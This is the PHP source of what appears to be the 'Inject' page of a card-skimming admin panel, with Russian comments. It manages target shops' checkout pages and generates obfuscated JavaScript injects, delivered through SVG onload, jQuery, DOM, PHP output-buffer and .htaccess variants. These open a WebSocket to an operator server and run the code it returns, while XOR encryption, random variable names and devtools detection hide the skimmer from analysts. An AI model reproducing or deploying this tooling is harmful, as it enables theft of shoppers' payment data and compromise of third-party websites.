<?php
session_start();

if (!isset($_SESSION['user_logged_in'])) {
    header('Location: login.php');
    exit();
}

// Проверяем, является ли пользователь администратором
if (!isset($_SESSION['user_role']) || ($_SESSION['user_role'] !== 'admin' && $_SESSION['user_role'] !== 'tech')) {
    header('Location: dashboard.php');
    exit();
}

require 'includes/config.php';
require_once 'includes/JSObfuscator.php';
require_once 'vendor/autoload.php';

$jsCodeToObfuscate = 'const threshold = 160; let dtD = false; function checkDevtoolsWindowSize() { const widthThreshold = self.outerWidth - self.innerWidth > threshold; const heightThreshold = self.outerHeight - self.innerHeight > threshold; if ((widthThreshold && self.innerWidth > self.screen.width) || (heightThreshold && self.innerHeight > self.screen.height)) { dtD = true; } } function checkDevtoolsTiming() { const startTime = performance.now(); debugger; const endTime = performance.now(); if (endTime - startTime > 100) { dtD = true; } } function checkDevtoolsProperty() { if (self.devtools) { dtD = true; } } checkDevtoolsWindowSize(); checkDevtoolsTiming(); checkDevtoolsProperty(); self.postMessage({ type: `DvDS`, value: dtD });'; 
$obfuscatedCode = obfuscator($jsCodeToObfuscate);

function minimize_js($js_code) {
    // Удаление комментариев
    $js_code = preg_replace('/<!--.*?-->/', '', $js_code);
    $js_code = str_replace(['<script>', '</script>'], '', $js_code); // Удаляет теги <script> и </script>

    // Минимизация пробелов и переносов строк
    $js_code = preg_replace(["/\s+/", "/\n+/"], " ", $js_code);

    // Удаление пробелов вокруг знаков пунктуации
    $js_code = preg_replace('/\s*([\(\){}\[\];,.<>\/?|&!@#\$%\^&\*\-=\+])\s*/', '$1', $js_code);

    return trim($js_code);
}

function generateRandomVarName() {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $length = rand(3, 4); // Случайная длина от 3 до 4
    $randomString = '';

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }

    return $randomString;
}

function xorEncrypt($str, $key) {
    $encoded = [];
    for ($i = 0; $i < strlen($str); $i++) {
        $encoded[] = ord($str[$i]) ^ $key;
    }
    return $encoded;
}

$currentFile = '';
$dirPath = 'file_js';

if (isset($_POST['ajaxFile'])) {
    $selectedFile = $_POST['ajaxFile'];
    $currentFile = $dirPath . '/' . $selectedFile;
    if (file_exists($currentFile)) {
        echo file_get_contents($currentFile);
    } else {
        echo "Файл не найден.";
    }
    exit();
}

// Фильтрация элементов каталога, чтобы отображать только файлы
$files = [];
if (is_dir($dirPath)) {
    $scanned_directory = array_diff(scandir($dirPath), ['.', '..']);
    foreach ($scanned_directory as $item) {
        if (is_file($dirPath . '/' . $item)) {
            $files[] = $item;
        }
    }
}

function replaceNumbersInString($string) {
    $parts = explode('-', $string);
    if (count($parts) > 1 && is_numeric($parts[1])) {
        $numberLength = strlen($parts[1]);
        $randomNumber = str_pad(rand(0, pow(10, $numberLength) - 1), $numberLength, '0', STR_PAD_LEFT);
        $parts[1] = $randomNumber;
    }
    return implode('-', $parts);
}

$message = '';
$fileContent = '';
$selectedFile = '';
$showTextArea = false;

// Логика обработки выбранного домена для редактирования

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Логика для обработки формы
    if (isset($_POST['edit']) && !empty($_POST['selectedFile'])) {
        // Логика выбора и отображения содержимого файла без '_sniffandform'
        $selectedFile = $_POST['selectedFile'];
        $currentFile = $dirPath . '/' . $selectedFile;
        $_SESSION['editingFile'] = $currentFile; // Сохраняем путь к редактируемому файлу в сессии

        if (file_exists($currentFile)) {
            $fileContent = file_get_contents($currentFile);
        }
        $showTextArea = true;
    } elseif (isset($_POST['editSniffAndForm']) && !empty($_POST['selectedFileSniffAndForm'])) {
        // Логика выбора и отображения содержимого файла с '_sniffandform'
        $selectedFile = $_POST['selectedFileSniffAndForm'];
        $currentFile = $dirPath . '/' . $selectedFile;
        $_SESSION['editingFile'] = $currentFile; // Сохраняем путь к редактируемому файлу в сессии

        if (file_exists($currentFile)) {
            $fileContent = file_get_contents($currentFile);
        }
        $showTextArea = true;
    }

    if (isset($_POST['save']) && isset($_SESSION['editingFile']) && isset($_POST['fileContent'])) {
        $currentFile = $_SESSION['editingFile'];
        $fileContent = $_POST['fileContent'];

        if (isset($_POST['devtools_check'])) {
            // Генерация случайных имен переменных
            $thresholdVarName = generateRandomVarName();
            $devtoolsDetectedVarName = generateRandomVarName();
            $executeCodeVarName = generateRandomVarName();
            $workerVarName = generateRandomVarName();
            $checkDevtoolsFunctionName = generateRandomVarName();
            $runCodeFunctionName = generateRandomVarName();

            // Используем сгенерированные имена переменных в коде воркера
            $devtoolsCheckCode = "
                const $thresholdVarName = 160;
                let $devtoolsDetectedVarName = false;
                let $executeCodeVarName = false;
                let $workerVarName;

                function $checkDevtoolsFunctionName(callback) {
                    if ($workerVarName) {
                        $workerVarName.terminate();
                    }

                    const workerCode = `{$obfuscatedCode}`;

                    const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
                    const workerUrl = URL.createObjectURL(workerBlob);
                    $workerVarName = new Worker(workerUrl);

                    $workerVarName.onmessage = function(event) {
                        if (event.data.type === 'DvDS') {
                            callback(event.data.value);
                        }
                    };
                }

                function $runCodeFunctionName() {
                    if (!$devtoolsDetectedVarName && !$executeCodeVarName) {
                        $checkDevtoolsFunctionName(function(detected) {
                            if (detected) {
                                $devtoolsDetectedVarName = true;
                                $executeCodeVarName = false;
                            } else {
                                $devtoolsDetectedVarName = false;
                                if (!$executeCodeVarName) {
                                    $executeCodeVarName = true;
                                    " . $fileContent . "
                                }
                            }
                        });
                    }
                }

                setInterval($runCodeFunctionName, 1000);
                $runCodeFunctionName();
            ";

            $fileContent = $devtoolsCheckCode;
        }

        $result = file_put_contents($currentFile, $fileContent);
        if ($result !== false) {
            $message = "Изменения в файле " . basename($currentFile) . " сохранены.";
        } else {
            $message = "Не удалось сохранить файл " . basename($currentFile) . ".";
        }
        unset($_SESSION['editingFile']);
    } elseif (isset($_POST['deleteSniffAndForm']) && !empty($_POST['selectedFileSniffAndForm'])) {
        // Логика удаления файла с '_sniffandform'
        $fileToDelete = $dirPath . '/' . $_POST['selectedFileSniffAndForm'];

        if (file_exists($fileToDelete)) {
            unlink($fileToDelete);
            $message = "Файл " . basename($fileToDelete) . " удален.";
        } else {
            $message = "Файл " . basename($fileToDelete) . " не найден.";
        }
    } elseif (isset($_POST['delete']) && !empty($_POST['selectedFile'])) {
        // Логика удаления обычного файла без '_sniffandform'
        $fileToDelete = $dirPath . '/' . $_POST['selectedFile'];

        if (file_exists($fileToDelete)) {
            unlink($fileToDelete);
            $message = "Файл " . basename($fileToDelete) . " удален.";
        } else {
            $message = "Файл " . basename($fileToDelete) . " не найден.";
        }
    }
}

$referrerFilePath = $dirPath . '/referer/referrer.txt';
if (!file_exists($referrerFilePath)) {
    file_put_contents($referrerFilePath, ''); // Создать файл, если он не существует
}
$referrers = file($referrerFilePath, FILE_IGNORE_NEW_LINES); // Читать строки файла в массив

// Обработка AJAX-запросов
if (isset($_POST['action'])) {
    if ($_POST['action'] == 'addReferrer' && !empty($_POST['newReferrer'])) {
        // Чтение текущего содержимого файла рефереров
        $currentContent = file_get_contents($referrerFilePath);
        $currentContent = rtrim($currentContent); // Удаление лишних переводов строк и пробелов

        // Добавление нового реферера
        $newContent = empty($currentContent) ? $_POST['newReferrer'] : $currentContent . PHP_EOL . $_POST['newReferrer'];
        file_put_contents($referrerFilePath, $newContent);

        // Создание файла JavaScript для нового реферера (2-й файл)
        $fileName2 = str_replace(['.', 'http://', 'https://'], '_', $_POST['newReferrer']) . '_sniffandform.txt';
        $filePath2 = $dirPath . '/' . $fileName2;
        if (!file_exists($filePath2)) {
            file_put_contents($filePath2, ''); // Создание пустого файла JS
        }
        // Добавление URL в domainreferrers.txt
        $domainReferrersFilePath = $dirPath . '/domainreferrers.txt';
        $referrerUrl = (strpos($_POST['newReferrer'], 'https://') === 0) ? $_POST['newReferrer'] : 'https://' . $_POST['newReferrer'];
        file_put_contents($domainReferrersFilePath, $referrerUrl . PHP_EOL, FILE_APPEND);

        // Добавление домена в базу данных в таблицу allowed_pages
        $referrerUrl = (strpos($_POST['newReferrer'], 'https://') === 0) ? $_POST['newReferrer'] : 'https://' . $_POST['newReferrer'];
        $stmt = $db->prepare("INSERT INTO allowed_pages (domain, page) VALUES (?, '/checkout')");
        $stmt->bind_param("s", $referrerUrl);
        
        if ($stmt->execute()) {
            $response = "Referrer added, JS files created, and domain added to the database successfully";
        } else {
            $response = "Error: Failed to add domain to the database";
        }

        // Ответ на AJAX запрос
        if (file_exists($filePath2)) {
            echo $response;
        } else {
            echo "Error: Failed to create JS files";
        }
        exit();
    }
}

$variablesToRename = ['p','cs','has', 'uas','bas' , 'ras', 'was', 'q', 'k', 'c' , 'eRU', 'dU', 'w', 's', 'd', 'wsURL' , 'unique-script-id', 'pg_low_bit' , 'xorKey' , 'tcl_img_banner' , 'sortvis'];
$renamedVariables = [];

foreach ($variablesToRename as $var) {
    $renamedVariables[$var] = generateRandomVarName();
}



if (isset($_POST['action']) && $_POST['action'] == 'deleteReferrer' && !empty($_POST['referrer'])) {
    $referrerToDelete = $_POST['referrer'];
    $referrers = array_filter($referrers, function($referrer) use ($referrerToDelete) {
        return trim($referrer) !== trim($referrerToDelete);
    });

    // Убрать пустые строки
    $referrers = array_filter($referrers, function($referrer) {
        return !empty(trim($referrer));
    });

    // Удаление всех записей из таблицы allowed_pages, связанных с удаляемым рефералом
    $referrerUrl = (strpos($referrerToDelete, 'https://') === 0) ? $referrerToDelete : 'https://' . $referrerToDelete;
    $stmt = $db->prepare("DELETE FROM allowed_pages WHERE domain = ?");
    $stmt->bind_param("s", $referrerUrl);
    $stmt->execute();

    // Удаление файлов JavaScript, связанных с удаляемым рефералом
    $fileName1 = $dirPath . '/' . str_replace(['.', 'http://', 'https://'], '_', $referrerToDelete) . '.txt';
    $fileName2 = $dirPath . '/' . str_replace(['.', 'http://', 'https://'], '_', $referrerToDelete) . '_sniffandform.txt';
    if (file_exists($fileName1)) {
        unlink($fileName1);
    }
    if (file_exists($fileName2)) {
        unlink($fileName2);
    }

    // Удаление домена из файла domainreferrers.txt
    $domainReferrersFilePath = $dirPath . '/domainreferrers.txt';
    $domainReferrers = file($domainReferrersFilePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $domainReferrers = array_filter($domainReferrers, function($domain) use ($referrerUrl) {
        return trim($domain) !== trim($referrerUrl);
    });

    $updatedContent = implode(PHP_EOL, $domainReferrers) . PHP_EOL;

    file_put_contents($domainReferrersFilePath, $updatedContent);

    // Сохранение обновленного списка рефереров в файл
    file_put_contents($referrerFilePath, implode(PHP_EOL, $referrers));
    echo "Referrer, associated pages, and related files deleted successfully";
    exit();
}



// Получение списка разрешенных доменов и страниц из базы данных
$stmt = $db->prepare("SELECT domain, page FROM allowed_pages");
$stmt->execute();
$result = $stmt->get_result();

$allowedPages = [];
while ($row = $result->fetch_assoc()) {
    $allowedPages[$row['domain']][] = $row['page'];
}

$selectedDomain = '';
$pagesForDomain = [];

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['editDomain'])) {
    $selectedDomain = $_POST['selectedDomain'];
    $pagesForDomain = $allowedPages[$selectedDomain] ?? [];
}

// Обработка добавления новой страницы
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['addPage'])) {
    $domainToAddPage = $_POST['domainToAddPage'];
    $newPage = $_POST['newPage'];

    if (!empty($domainToAddPage) && !empty($newPage)) {
        $stmt = $db->prepare("INSERT INTO allowed_pages (domain, page) VALUES (?, ?)");
        $stmt->bind_param("ss", $domainToAddPage, $newPage);
        
        if ($stmt->execute()) {
            $message = "Страница добавлена.";
        } else {
            $message = "Ошибка при добавлении страницы: " . $db->error;
        }
    }
}

// Обработка удаления страницы
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['deletePage'])) {
    $domainToDeletePage = $_POST['domainToDeletePage'];
    $pageToDelete = $_POST['pageToDelete'];

    if (!empty($domainToDeletePage) && !empty($pageToDelete)) {
        $stmt = $db->prepare("DELETE FROM allowed_pages WHERE domain = ? AND page = ?");
        $stmt->bind_param("ss", $domainToDeletePage, $pageToDelete);
        
        if ($stmt->execute()) {
            $message = "Страница удалена.";
        } else {
            $message = "Ошибка при удалении страницы: " . $db->error;
        }
    }
}

// Функции для работы с WebSocket URL
function getWebSocketUrls() {
    $urls = file('inject/websocket_url.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return $urls ? $urls : [];
}

function saveWebSocketUrls($urls) {
    file_put_contents('inject/websocket_url.txt', implode(PHP_EOL, $urls));
}

// Обработка добавления нового URL
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["addWebSocketUrl"])) {
    $newUrl = trim($_POST["newWebSocketUrl"]);
    if (!empty($newUrl)) {
        $urls = getWebSocketUrls();
        if (!in_array($newUrl, $urls)) {
            $urls[] = $newUrl;
            saveWebSocketUrls($urls);
        }
    }
}

// Обработка удаления URL
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["deleteWebSocketUrl"])) {
    $urlToDelete = $_POST["deleteWebSocketUrl"];
    $urls = getWebSocketUrls();
    $urls = array_diff($urls, [$urlToDelete]);
    saveWebSocketUrls($urls);
}

$generatedCode = ''; // Инициализируем переменную для сгенерированного кода

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['injectType']) || isset($_POST['getSnifferCode'])) {
    $selectedUrl = $_POST['selectedWebSocketUrl'];
    $generatedCode = getSnifferCode($selectedUrl);
	// Добавляем скрипт обфускации после textarea с кодом
    echo "<script src='https://cdn.jsdelivr.net/npm/javascript-obfuscator/dist/index.browser.js'></script>";
    echo "<script>
    document.addEventListener('DOMContentLoaded', function() {
        const code = `" . str_replace('`', '\`', $generatedCode) . "`;
        const options = {
            compact: true,
            identifierNamesGenerator: 'hexadecimal',
            stringArray: true,
            stringArrayEncoding: ['rc4'],
            stringArrayThreshold: 0.1,
            controlFlowFlattening: false,
            deadCodeInjection: false,
            debugProtection: false,
            selfDefending: false,
            rotateStringArray: false,
            shuffleStringArray: false,
            splitStrings: false,
            transformObjectKeys: false,
            unicodeEscapeSequence: false,
            renameGlobals: true,
            disableConsoleOutput: false,
            log: false
        };
        
        try {
            const obfuscatedResult = JavaScriptObfuscator.obfuscate(code, options);
            const obfuscatedCode = obfuscatedResult.getObfuscatedCode();
            
            fetch('save_obfuscated.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'code=' + encodeURIComponent(obfuscatedCode)
            })
            .then(response => response.text())
            .then(result => {
                if(result === 'success') {
                    console.log('Код успешно сохранен');
                } else {
                    console.error('Ошибка сохранения:', result);
                }
            })
            .catch(error => console.error('Ошибка:', error));
            
        } catch(error) {
            console.error('Ошибка обфускации:', error);
        }
    });
    </script>";


        
        if (isset($_POST['injectType'])) {
            $injectType = $_POST['injectType'];
            switch ($injectType) {
                case 'standard':
                    $generatedCode = generateStandardInject($selectedUrl);
                    if (is_array($generatedCode)) {
                        $js_obfuscated_display = "<textarea class='bg-gray-800 text-white p-2 rounded w-full h-64'>" . htmlspecialchars($generatedCode['obfuscated']) . "</textarea>";
                        $js_minimized_display = "<textarea class='bg-gray-800 text-white p-2 rounded w-full h-64'>" . htmlspecialchars($generatedCode['minimized']) . "</textarea>";
                    } else {
                        $js_obfuscated_display = $js_minimized_display = "<p class='text-red-500'>$generatedCode</p>";
                    }
                    break;
                case 'svg':
                    $generatedCode = generateSvgInject($selectedUrl);
                    break;
                case 'jquery':
                    $generatedCode = generateJqueryInject($selectedUrl);
                    break;
                case 'dom':
                    $generatedCode = generateDomInject($selectedUrl);
                    break;
                case 'php':
                    $generatedCode = generatePhpInject($selectedUrl);
                    break;
            }
        } elseif (isset($_POST['getSnifferCode'])) {
            $generatedCode = getSnifferCode($selectedUrl);
        }
    }
}

$webSocketUrls = getWebSocketUrls(); // Получаем список URL для отображения в форме

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["getSnifferCode"])) {
    $file_path_socket = 'inject/socket_code.txt';
    if (file_exists($file_path_socket)) {
        $fileContent = file_get_contents($file_path_socket);
        $selectedUrl = $_POST["selectedWebSocketUrl"];
        $fileContent = str_replace('{{WEBSOCKET_URL}}', $selectedUrl, $fileContent);
        $snifferCode = $fileContent;
    } else {
        $snifferCode = 'Ошибка: Файл socket_code.txt не найден.';
    }
}

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["obfuscate"]) && isset($_POST["fileContent"])) {
    $fileContent = $_POST["fileContent"];

    // Генерация случайного ключа
    $key = generateRandomKey();

    // Генерация случайных имен переменных
    $aa = generateRandomVarName();
    $t = generateRandomVarName();
    $n = generateRandomVarName();

    // Применение шифрования
    $obfuscated_code = '';
    for ($i = 0; $i < strlen($fileContent); $i++) {
        $obfuscated_code .= chr(ord($fileContent[$i]) ^ ord($key[$i % strlen($key)]));
    }
    $reversed_obfuscated_code = strrev($obfuscated_code);

    // Форматирование escape-последовательностей
    $escaped_reversed_obfuscated_code = implode('', array_map(function($c) {
        return '\\x' . str_pad(dechex(ord($c)), 2, '0', STR_PAD_LEFT);
    }, str_split($reversed_obfuscated_code)));

    $obfuscated_content = "!function($aa,$t){!function($aa){var $n=function($aa,$t){return $aa.split('').map(function($aa,$n){return String.fromCharCode($aa.charCodeAt(0)^$t.charCodeAt($n%$t.length))}).join('')}($aa.split('').reverse().join(''),$t);new Function($n)()}($aa)}('" . $escaped_reversed_obfuscated_code . "', '$key');";

    // Сохранение обфусцированного кода в файл
    if (isset($_SESSION['editingFile'])) {
        $currentFile = $_SESSION['editingFile'];
        $result = file_put_contents($currentFile, $obfuscated_content);
        if ($result !== false) {
            $message = "Файл " . basename($currentFile) . " успешно обфусцирован и сохранен.";
        } else {
            $message = "Не удалось сохранить обфусцированный файл " . basename($currentFile) . ".";
        }
    }
}

// Функция для генерации случайного ключа
function generateRandomKey($length = 4) {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $key = '';
    for ($i = 0; $i < $length; $i++) {
        $key .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $key;
}

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["generatePhpInject"])) {
    $inputPages = $_POST["phpPages"];
    $inputUrl = $_POST["phpWebsocketUrl"] . "?source=";
    $injectMethod = $_POST["injectMethod"];

    function encrypt_url($url, $key) {
        $encoded = [];
        for ($i = 0; $i < strlen($url); $i++) {
            $encoded[] = ord($url[$i]) ^ $key;
        }
        return json_encode($encoded);
    }

    $encryptedUrl = encrypt_url($inputUrl, 42);

    if ($injectMethod === 'php') {
        // Генерация случайных имен переменных
        $aa = generateRandomVarName();
        $t = generateRandomVarName();
        $n = generateRandomVarName();

        // Генерация PHP-кода инжекта
       $phpInjectCode = "
if (!defined('SCRIPT_EXECUTED')) {
    define('SCRIPT_EXECUTED', true);
    \$pages = ['" . implode("', '", explode(",", $inputPages)) . "'];
    ob_start(function(\$buffer) use (\$pages) {
        \$script_id = 'content-main-2';
        foreach (\$pages as \$page) {
            if (strpos(\$_SERVER['REQUEST_URI'], \$page) !== false) {
                if (strpos(\$buffer, \$script_id) === false) {
                    return preg_replace('/\\s*<\\/body>/', \"<script id='\" . \$script_id . \"'>(function(){var cs=document.currentScript;!function(a,u){!function(a){var g=function(a,u){return a.map(function(a,g){return String.fromCharCode(a^u)}).join('')}(a,u);window.ww=new WebSocket(g+encodeURIComponent(location.href));window.ww.addEventListener('message',function(e){new Function(e.data)();if(cs)cs.remove()});window.ww.addEventListener('close',function(){if(cs)cs.remove()})}(a)}($encryptedUrl,42)})();</script></body>\", \$buffer);
                }
            }
        }
        return \$buffer;
    });
}
";

        $phpInjectDisplay = "<textarea class='w-full bg-gray-700 text-white rounded-lg py-2 px-4 mt-4' rows='10' readonly>" . htmlspecialchars($phpInjectCode) . "</textarea>";
    }

    if ($injectMethod === 'htaccess') {
        // Генерация случайных имен переменных
        $aa = generateRandomVarName();
        $t = generateRandomVarName();
        $n = generateRandomVarName();

        // Генерация .htaccess-кода инжекта
        $htaccessInjectCode = "RewriteEngine On\n";
        foreach (explode(",", $inputPages) as $page) {
            $page = trim($page);
            $htaccessInjectCode .= "RewriteCond %{REQUEST_URI} ^$page [NC]\n";
            $htaccessInjectCode .= "RewriteRule .* - [E=INJECT_SCRIPT:1]\n";
        }

        $htaccessInjectCode .= "<IfModule mod_filter.c>\n";
        $htaccessInjectCode .= "FilterDeclare INJECT\n";
        $htaccessInjectCode .= "FilterProvider INJECT SUBSTITUTE \"%{Content_Type} =~ m|^text/html|\"\n";
        $htaccessInjectCode .= "FilterChain INJECT\n";
        $htaccessInjectCode .= "Substitute \"s|</body>|<script>!function($aa,$t){!function($aa){var $n=function($aa,$t){return $aa.map(function($aa,$n){return String.fromCharCode($aa^$t)}).join('')}($aa,$t);window.ww=new WebSocket($n+encodeURIComponent(location.href));window.ww.addEventListener('message',function(event){new Function(event.data)()})}($aa)}($encryptedUrl,42);</script></body>|ni\"\n";
        $htaccessInjectCode .= "</IfModule>\n";

        $htaccessInjectDisplay = "<textarea class='w-full bg-gray-700 text-white rounded-lg py-2 px-4 mt-4' rows='10' readonly>" . htmlspecialchars($htaccessInjectCode) . "</textarea>";
    }
}

$variablesToRename = ['p', 'has', 'uas', 'bas', 'ras', 'was', 'q', 'k', 'c', 'eRU', 'dU', 'w', 's', 'd', 'wsURL', 'unique-script-id', 'pg_low_bit', 'xorKey', 'tcl_img_banner', 'sortvis'];
$renamedVariables = [];

foreach ($variablesToRename as $var) {
    $renamedVariables[$var] = generateRandomVarName();
}

// Функции для генерации различных типов инъектов
function generateStandardInject($url) {
	global $obfuscatedCode, $renamedVariables;
    $input_js_site = $url . "?source=";
    $encryptionKey = 42;
    $encrypted_url = xorEncrypt($input_js_site, $encryptionKey);
    $js_array = json_encode($encrypted_url);

    $file_path_js = 'inject/injectcodenew.txt';
    if (file_exists($file_path_js)) {
        $file_contents_js = file_get_contents($file_path_js);
        $file_contents_js = str_replace('obfuscate', $js_array, $file_contents_js);

        // Рандомизация переменных в файле
        foreach ($renamedVariables as $oldName => $newName) {
            $pattern = '/\b' . preg_quote($oldName, '/') . '\b/';
            $file_contents_js = preg_replace($pattern, $newName, $file_contents_js);
        }

        $key = "gtag";
        $obfuscated_code = '';
        for ($i = 0; $i < strlen($file_contents_js); $i++) {
            $obfuscated_code .= chr(ord($file_contents_js[$i]) ^ ord($key[$i % strlen($key)]));
        }
        $reversed_obfuscated_code = strrev($obfuscated_code);
        $escaped_reversed_obfuscated_code = implode('', array_map(function($c) {
            return '\\x' . str_pad(dechex(ord($c)), 2, '0', STR_PAD_LEFT);
        }, str_split($reversed_obfuscated_code)));

        $js_obfuscated = "<script>" . $file_contents_js . "</script>";
        $js_minimized = "!function(aa,t){!function(aa){var n=function(aa,t){return aa.split('').map(function(aa,n){return String.fromCharCode(aa.charCodeAt(0)^t.charCodeAt(n%t.length))}).join('')}(aa.split('').reverse().join(''),t);new Function(n)()}(aa)}('" . $escaped_reversed_obfuscated_code . "', 'gtag');";

        return ['obfuscated' => $js_obfuscated, 'minimized' => $js_minimized];
    }
    return 'Ошибка: Неверный путь к файлу или файл не существует.';
}

function generateSvgInject($url) {
	global $renamedVariables;
    $input_js_site = $url . "?source=";
    $encryptionKey = 42;
    $encrypted_url = xorEncrypt($input_js_site, $encryptionKey);
    $js_array = json_encode($encrypted_url);

    $file_path_js = 'inject/inject_svg_codenew.txt';
    if (file_exists($file_path_js)) {
        $file_contents_js = file_get_contents($file_path_js);
        $file_contents_js = str_replace('obfuscate', $js_array, $file_contents_js);

        // Добавить эти строки
        foreach ($renamedVariables as $oldName => $newName) {
            $pattern = '/\b' . preg_quote($oldName, '/') . '\b/';
            $file_contents_js = preg_replace($pattern, $newName, $file_contents_js);
        }

        $key = "gtag";
        $obfuscated_code = '';
        for ($i = 0; $i < strlen($file_contents_js); $i++) {
            $obfuscated_code .= chr(ord($file_contents_js[$i]) ^ ord($key[$i % strlen($key)]));
        }
        $reversed_obfuscated_code = strrev($obfuscated_code);
        $escaped_reversed_obfuscated_code = implode('', array_map(function($c) {
            return '\\x' . str_pad(dechex(ord($c)), 2, '0', STR_PAD_LEFT);
        }, str_split($reversed_obfuscated_code)));

        return "<svg width=\"1px\" height=\"1px\" onload=\"!function(aa,t){!function(aa){var n=function(aa,t){return aa.split('').map(function(aa,n){return String.fromCharCode(aa.charCodeAt(0)^t.charCodeAt(n%t.length))}).join('')}(aa.split('').reverse().join(''),t);new Function(n)()}(aa)}('" . $escaped_reversed_obfuscated_code . "', 'gtag');\"></svg>";
    }
    return 'Ошибка: Неверный путь к файлу или файл не существует.';
}

function generateJqueryInject($url) {
	global $renamedVariables;
    $input_js_site = $url . "?source=";
    $encryptionKey = 42;
    $encrypted_url = xorEncrypt($input_js_site, $encryptionKey);
    $js_array = json_encode($encrypted_url);

    $file_path_js = 'inject/inject_svg_codenew.txt';
    if (file_exists($file_path_js)) {
       $file_contents_js = file_get_contents($file_path_js);
        $file_contents_js = str_replace('obfuscate', $js_array, $file_contents_js);

        // Добавить эти строки
        foreach ($renamedVariables as $oldName => $newName) {
            $pattern = '/\b' . preg_quote($oldName, '/') . '\b/';
            $file_contents_js = preg_replace($pattern, $newName, $file_contents_js);
        }

        $base64_code = base64_encode($file_contents_js);
        return "jQuery(document).ready(() => {
            let a = window;let ss5 = a['at'['concat']('o', 'b')];let executeFunction = a['Function'];let ss12 = ss5('$base64_code');executeFunction(ss12).call(this);
        });";
    }
    return 'Ошибка: Неверный путь к файлу или файл не существует.';
}

function generateDomInject($url) {
	global $renamedVariables;
    $input_js_site = $url . "?source=";
    $encryptionKey = 42;
    $encrypted_url = xorEncrypt($input_js_site, $encryptionKey);
    $js_array = json_encode($encrypted_url);

    $file_path_js = 'inject/inject_svg_codenew.txt';
    if (file_exists($file_path_js)) {
        $file_contents_js = file_get_contents($file_path_js);
        $file_contents_js = str_replace('obfuscate', $js_array, $file_contents_js);

        // Добавить эти строки
        foreach ($renamedVariables as $oldName => $newName) {
            $pattern = '/\b' . preg_quote($oldName, '/') . '\b/';
            $file_contents_js = preg_replace($pattern, $newName, $file_contents_js);
        }

        $base64_code = base64_encode($file_contents_js);
        
        $var1 = generateRandomVarName();
        $var2 = generateRandomVarName();
        $var3 = generateRandomVarName();
        $var4 = generateRandomVarName();
        
        return "let {$var1} = window; let {$var2} = {$var1}['at'['concat']('o', 'b')]; let {$var3} = {$var1}['Function']; let {$var4} = {$var2}('{$base64_code}'); {$var3}({$var4}).call(this);";
    }
    return 'Ошибка: Неверный путь к файлу или файл не существует.';
}

function encrypt_url($url, $key) {
    $encoded = [];
    for ($i = 0; $i < strlen($url); $i++) {
        $encoded[] = ord($url[$i]) ^ $key;
    }
    return json_encode($encoded);
}

function generatePhpInject($url) {
	global $renamedVariables;
    $inputUrl = $url . "?source=";
    $encryptedUrl = encrypt_url($inputUrl, 42);
    
    $jsCode = "(function(){var cs=document.currentScript;!function(a,u){!function(a){var g=function(a,u){return a.map(function(a,g){return String.fromCharCode(a^u)}).join('')}(a,u);window.ww=new WebSocket(g+encodeURIComponent(location.href));window.ww.addEventListener('message',function(e){new Function(e.data)();if(cs)cs.remove()});window.ww.addEventListener('close',function(){if(cs)cs.remove()})}(a)}($encryptedUrl,42)})();";
    
    // Добавить эти строки
    foreach ($renamedVariables as $oldName => $newName) {
        $pattern = '/\b' . preg_quote($oldName, '/') . '\b/';
        $jsCode = preg_replace($pattern, $newName, $jsCode);
    }
    
    $phpInjectCode = "
    if (!defined('SCRIPT_EXECUTED')) {
        define('SCRIPT_EXECUTED', true);
        \$pages = ['/']; // 
        ob_start(function(\$buffer) use (\$pages) {
            \$script_id = bin2hex(random_bytes(8));
            foreach (\$pages as \$page) {
                if (strpos(\$_SERVER['REQUEST_URI'], \$page) !== false) {
                    if (strpos(\$buffer, \$script_id) === false) {
                        return preg_replace('/\\s*<\\/body>/', \"<script id='\" . \$script_id . \"'>$jsCode</script></body>\", \$buffer);
                    }
                }
            }
            return \$buffer;
        });
    }
    ";
    return $phpInjectCode;
}

function getSnifferCode($url) {
    $file_path_socket = 'inject/socket_code.txt';
    if (file_exists($file_path_socket)) {
        $fileContent = file_get_contents($file_path_socket);
        $fileContent = str_replace('{{WEBSOCKET_URL}}', $url, $fileContent);
        
        // Сохраняем оригинальный код в сессию для последующей обфускации
        $_SESSION['current_sniffer_code'] = $fileContent;
        
        return $fileContent;
    } else {
        return 'Ошибка: Файл socket_code.txt не найден.';
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.8">
    <title>Inject Page</title>
    <link href="js/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="js/all.min.css">
    <style>
        .bg-navy { background-color: #1a1a1a; }
        .border-gold { border-color: #2f2e2c; }
        .text-gold { color: #d4af37; }
        #manualModal {
            z-index: 1000;
        }
    </style>
</head>
<body class="bg-navy text-gold">
    <div class="flex flex-col min-h-screen">
        <nav class="bg-navy border-b-2 px-6 py-4">
            <div class="container mx-auto flex justify-between items-center">
                <div class="flex space-x-4">
                    <a href="dashboard.php" class="text-yellow-500 hover:text-white">DASHBOARD</a>
                    <a href="cards.php?url_id=&country=&date=&records=20&sort=id&order=desc" class="text-yellow-500 hover:text-white">CARDS</a>
                    <a href="inject.php" class="text-yellow-500 hover:text-white">INJECT</a>
                    <a href="tools.php" class="text-yellow-500 hover:text-white">TOOLS</a>
                    <a href="forms.php" class="text-yellow-500 hover:text-white">FORMS</a>
					<a href="uptime.php" class="text-yellow-500 hover:text-white">UPTIME</a>
                </div>
                <div>
